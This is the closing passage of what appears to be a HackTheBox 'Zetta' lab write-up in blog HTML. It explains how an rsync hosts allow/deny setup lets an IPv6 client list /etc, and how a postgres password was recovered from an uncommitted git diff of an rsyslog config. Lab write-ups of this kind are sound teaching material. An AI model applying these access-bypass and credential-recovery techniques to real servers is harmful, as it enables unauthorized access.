+75227828225494287741264594799797  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb  dddddddddddddddddddddddddddddddd  STuEFd7xqR6nNJDHoWH2URITV75PHX9s
+</span></code></pre></div></div>
+<h3 id="rsync-config">RSYNC Config</h3>
+<p>When using <code class="language-plaintext highlighter-rouge">rsync</code> to connect to Zetta, I was able to access and list the <code class="language-plaintext highlighter-rouge">/etc</code> directory. If I look at how all the other paths were blocked, each contained:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hosts allow = 104.24.0.54
+</code></pre></div></div>
+<p>From the <a href="https://download.samba.org/pub/rsync/rsyncd.conf.html">rsyncd documentation</a>:</p>
+<blockquote>
+<p><strong><em>*hosts allow*</em></strong></p>
+<p>This parameter allows you to specify a list of comma- and/or whitespace-separated patterns that are matched against a connecting client’s hostname and IP address.  If none of the patterns match, then the connection is rejected.</p>
+</blockquote>
+<p>When I look at <code class="language-plaintext highlighter-rouge">/etc</code>, I see:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Temporarily disabled access to /etc for security reasons, the networks are
+# have been found to access the share! Only allow 127.0.0.1, deny 0.0.0.0/0!
+#hosts allow = 104.24.0.54 13.248.97.0/24 52.94.69.0/24 52.219.72.0/22
+hosts allow = 127.0.0.1/32
+hosts deny = 0.0.0.0/0
+</code></pre></div></div>
+<p>Reading a bit further down in the <code class="language-plaintext highlighter-rouge">hosts allow</code> documentation:</p>
+<blockquote>
+<p>You can also combine “hosts allow” with a separate “hosts  deny” option.  If  both  options  are specified then the “hosts allow” option s checked first and a match results in the  client  being able  to  connect. The “hosts deny” option is then checked and a match means that the host is rejected.  If  the  host  does  not match either the “hosts allow” or the “hosts deny” patterns then it is allowed to connect.</p>
+</blockquote>
+<p>Because my IPv6 address matches neither 127.0.0.1/32 nor 0.0.0.0/0, it is allowed.</p>
+<p>roy’s home directory doesn’t have any host-based whitelist or blacklist, but it would be quite difficult to connect to it without knowing it exists and the length of the password, both of which are found in <code class="language-plaintext highlighter-rouge">/etc</code>.</p>
+<h3 id="syslog-config-1">Syslog Config</h3>
+<p>When I was evaluating the config file in <code class="language-plaintext highlighter-rouge">/etc/rsyslog.d</code>, I noticed there were changes since the last commit that I couldn’t read:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/etc/rsyslog.d$ </span>git status
+<span class="go">On branch master
+Changes not staged for commit:
+  (use "git add &lt;file&gt;..." to update what will be committed)
+  (use "git checkout -- &lt;file&gt;..." to discard changes in working directory)
+
+        modified:   pgsql.conf
+
+no changes added to commit (use "git add" and/or "git commit -a")
+</span></code></pre></div></div>
+<p>I was able to pull the version from the previous commit from the <code class="language-plaintext highlighter-rouge">.git</code> dir, but I wasn’t able to recover the uncommitted  changes.</p>
+<p>As root, I went back and checked it. I can run <code class="language-plaintext highlighter-rouge">git diff HEAD</code> to compare what’s currently there with the last commit. It turns out the actual postgres password was there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@zetta:/etc/rsyslog.d# </span>git diff HEAD
+<span class="go">diff --git a/pgsql.conf b/pgsql.conf
+index 9649f68..9d02b95 100644
+</span><span class="diff-removed">--- a/pgsql.conf
+</span><span class="diff-added">+++ b/pgsql.conf
+</span><span class="diff-lines">@@ -19,4 +19,4 @@ template(name="sql-syslog" type="list" option.sql="on") {
+</span><span class="go"> module(load="ompgsql")
+ 
+</span><span class="c"> # Only forward local7.info for testing.
+</span><span class="diff-removed">-local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
+</span><span class="diff-added">+local7.info action(type="ompgsql" server="localhost" user="postgres" pass="sup3rs3cur3p4ass@postgres" db="syslog" template="sql-syslog")
+</span></code></pre></div></div>
+<p>If that had been committed, I could have skipped right to root. This was a clever use of Git by the machine author to show us most of the configuration, while keeping the password from us for a bit.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2020/02/22/htb-zetta.html"></a>
+</article>
